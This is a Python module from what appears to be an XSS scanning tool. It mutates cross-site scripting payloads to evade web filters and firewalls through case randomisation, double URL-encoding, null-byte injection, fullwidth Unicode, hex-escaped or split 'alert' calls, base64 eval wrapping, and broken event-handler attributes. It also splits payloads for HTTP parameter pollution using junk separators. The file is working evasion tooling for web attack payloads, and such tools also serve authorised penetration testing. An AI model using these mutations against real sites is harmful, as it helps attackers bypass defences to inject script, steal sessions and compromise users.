import os
import random
import re
from urllib.parse import quote

from payloads import CONTEXT_PAYLOADS, PAYLOADS_DB


_DEBUG = bool(os.environ.get("XSS_DEBUG"))


class Mutator:

    @staticmethod
    def case(p: str) -> str:
        out = []
        for c in p:
            if c.isalpha():
                out.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                out.append(c)
        return "".join(out)

    @staticmethod
    def html_entity(p: str) -> str:
        return p.replace("(", "&#40;").replace(")", "&#41;").replace("'", "&#39;").replace('"', "&#34;")

    @staticmethod
    def percent(p: str) -> str:
        return quote(p, safe="")

    @staticmethod
    def double_percent(p: str) -> str:
        return quote(quote(p, safe=""), safe="")

    @staticmethod
    def whitespace(p: str) -> str:
        return p.replace(" ", random.choice(["/", "\t", "\n", "/**/"]))

    @staticmethod
    def null_byte(p: str) -> str:
        # ── FIX: use RAW null byte (\x00), not the string "%00" ──
        # urlencode will encode "\x00" → "%00" once, and server decodes
        # back to a real null byte. "%00" would be double-encoded to
        # "%2500" and the server would see the literal 3-char string.
        if "script" in p.lower():
            return re.sub(r"(?i)script", "scr\x00ipt", p, count=1)
        return p.replace("=", "=\x00")

    @staticmethod
    def slash(p: str) -> str:
        return p.replace(" ", "/").replace("=", "/=")

    @staticmethod
    def unicode_full(p: str) -> str:
        table = str.maketrans({
            "'": "＇", '"': "＂", "(": "（", ")": "）",
            "<": "＜", ">": "＞", "=": "＝",
        })
        return p.translate(table)

    @staticmethod
    def hex_js(p: str) -> str:
        if "alert" in p:
            return p.replace("alert", "\\x61\\x6c\\x65\\x72\\x74")
        return p

    @staticmethod
    def js_fragment(p: str) -> str:
        if "alert" in p:
            return p.replace("alert", "al'+'ert")
        return p

    @staticmethod
    def bracket(p: str) -> str:
        if "alert(" in p:
            return p.replace("alert(", "window['ale'+'rt'](")
        return p

    @staticmethod
    def atob(p: str) -> str:
        if "alert(1)" in p:
            return p.replace("alert(1)", "eval(atob('YWxlcnQoMSk='))")
        return p

    @staticmethod
    def backtick(p: str) -> str:
        return p.replace("alert(1)", "alert`1`").replace("alert('1')", "alert`1`")

    @staticmethod
    def tag_break(p: str) -> str:
        return p.replace("<svg", "<svg\n").replace("<img", "<img\n").replace("onload", "\nonload")

    @staticmethod
    def attr_break(p: str) -> str:
        return p.replace("onload", "on/**/load").replace("onerror", "on/**/error").replace("ontoggle", "on/**/toggle")

    @staticmethod
    def space_slash(p: str) -> str:
        return re.sub(r"\s+", "/", p)

    @staticmethod
    def no_quotes(p: str) -> str:
        return p.replace("'", "").replace('"', "")

    TECHNIQUES = {
        "case": case,
        "html_entity": html_entity,
        "percent": percent,
        "double_percent": double_percent,
        "whitespace": whitespace,
        "null_byte": null_byte,
        "slash": slash,
        "unicode": unicode_full,
        "hex_js": hex_js,
        "js_fragment": js_fragment,
        "bracket": bracket,
        "atob": atob,
        "backtick": backtick,
        "tag_break": tag_break,
        "attr_break": attr_break,
        "space_slash": space_slash,
        "no_quotes": no_quotes,
    }

    @classmethod
    def apply(cls, payload: str, max_variants: int = 3) -> list:
        results = [payload]
        keys = list(cls.TECHNIQUES.keys())
        random.shuffle(keys)
        for name in keys[:max_variants]:
            try:
                fn = cls.TECHNIQUES[name]
                mut = fn.__func__(payload) if isinstance(fn, staticmethod) else fn(payload)
                if mut and mut != payload and mut not in results:
                    results.append(mut)
            except Exception as exc:
                # ── FIX: log in debug mode instead of silently swallowing ──
                if _DEBUG:
                    print(f"[mutator] {name} failed: {exc!r}")
                continue
        return results

    @classmethod
    def expand_list(cls, payloads: list, max_variants: int = 2) -> list:
        out = []
        seen = set()
        for p in payloads:
            for v in cls.apply(p, max_variants=max_variants):
                if v not in seen:
                    seen.add(v)
                    out.append(v)
        return out


def advanced_hpp_split(payload: str) -> list[str]:
    """
    HPP Advanced: variable chunk size + separator cycle.

    Encoding note (IMPORTANT):
      - Raw chars (\\x00, \\t, \\n, \\r\\n, " ") are encoded ONCE by urlencode
        → server decodes back to the raw char (null byte / tab / LF / space).
      - Pre-encoded strings ("%00", "%20", "%09", ...) get encoded AGAIN
        to "%2500", "%2520", ... → server sees literal "%00" / "%20" strings.
        These are for servers that perform a SECOND decode step (HTML entity,
        template rendering, etc.).
    """
    if not payload:
        return [""]

    separators = (
        # --- JS / HTML syntax junk ---
        "/**/",       # JS comment
        "///",        # multi-slash
        "/**//**/",   # stacked comments
        "'+'",        # JS string concat
        ";",          # statement break
        "/",          # single slash
        "+",          # urlencode → %2B (literal +); many servers decode + as space

        # --- Raw chars (single-encoded by urlencode) ---
        "\x00",       # → %00  (real null byte)
        "\t",         # → %09  (tab)
        "\n",         # → %0a  (LF)
        "\r\n",       # → %0d%0a (CRLF)
        " ",          # → %20 or + (space)

        # --- Pre-encoded (double-encoded by urlencode, for 2-pass decoders) ---
        "%00",        # → %2500
        "%09",        # → %2509
        "%0a",        # → %250a
        "%0d%0a",     # → %250d%250a
        "%20",        # → %2520
        "%2520",      # → %252520 (triple)

        # --- Unicode / entities ---
        "&#0;",       # HTML entity null
        "\u3000",     # fullwidth space
    )

    sizes = (3, 4, 8)
    size = sizes[len(payload) % 3]
    start = len(payload) % len(separators)

    result: list[str] = []
    i, j = 0, 0
    while i < len(payload):
        result.append(payload[i:i + size])
        i += size
        if i < len(payload):
            result.append(separators[(start + j) % len(separators)])
            j += 1
    return result or [payload]


def get_context_payloads(context: str, mutate: bool = True, max_variants: int = 2) -> list:
    if context == "all":
        out = []
        for lst in PAYLOADS_DB.values():
            out.extend(lst)
        for lst in CONTEXT_PAYLOADS.values():
            out.extend(lst)
        out = list(dict.fromkeys(out))
    elif context in CONTEXT_PAYLOADS:
        out = list(CONTEXT_PAYLOADS[context])
    else:
        out = []
    if mutate and out:
        out = Mutator.expand_list(out, max_variants=max_variants)
    return out